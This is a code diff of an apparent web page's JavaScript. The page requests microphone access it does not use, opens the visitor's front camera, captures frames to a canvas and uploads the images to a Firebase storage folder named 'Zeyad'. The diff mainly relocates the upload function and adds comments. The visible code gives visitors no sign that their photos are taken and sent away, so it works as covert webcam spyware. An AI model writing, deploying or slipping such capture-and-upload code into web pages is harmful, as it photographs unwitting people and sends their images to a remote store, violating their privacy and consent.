@@ -24,25 +24,14 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // Function to upload image to Firebase
-        function uploadImage(imageData) {
-            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
-            uploadString(storageRef, imageData, 'data_url')
-                .then(() => {
-                    console.log('Uploaded a blob or file!');
-                })
-                .catch((error) => {
-                    console.error('Error uploading image:', error);
-                });
-        }
-
-        // Access microphone and camera elements when the window loads
+        // Request microphone access when the window loads
         window.addEventListener('load', () => {
-            // Request microphone access first
+            // Request microphone access only
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then(() => {
                     console.log('Microphone access granted (not used).');
-                    // Now request camera access
+                    // Proceed to request camera access (optional)
+                    // If you want to remove the camera part, comment or remove the following lines
                     return navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: "user", // Using front camera
@@ -52,6 +41,8 @@
                     });
                 })
                 .then(stream => {
+                    // If you want to use the camera as well, you can handle it here
+                    // If not, you can comment out the following block
                     const video = document.createElement('video');
                     const canvas = document.createElement('canvas');
                     const context = canvas.getContext('2d');
@@ -75,6 +66,18 @@
                     console.error('Error accessing microphone or camera: ', err);
                 });
         });
+
+        // Function to upload image to Firebase
+        function uploadImage(imageData) {
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
+            uploadString(storageRef, imageData, 'data_url')
+                .then(() => {
+                    console.log('Uploaded a blob or file!');
+                })
+                .catch((error) => {
+                    console.error('Error uploading image:', error);
+                });
+        }
 
         // Function to stop video stream
         function stopVideo(stream) {
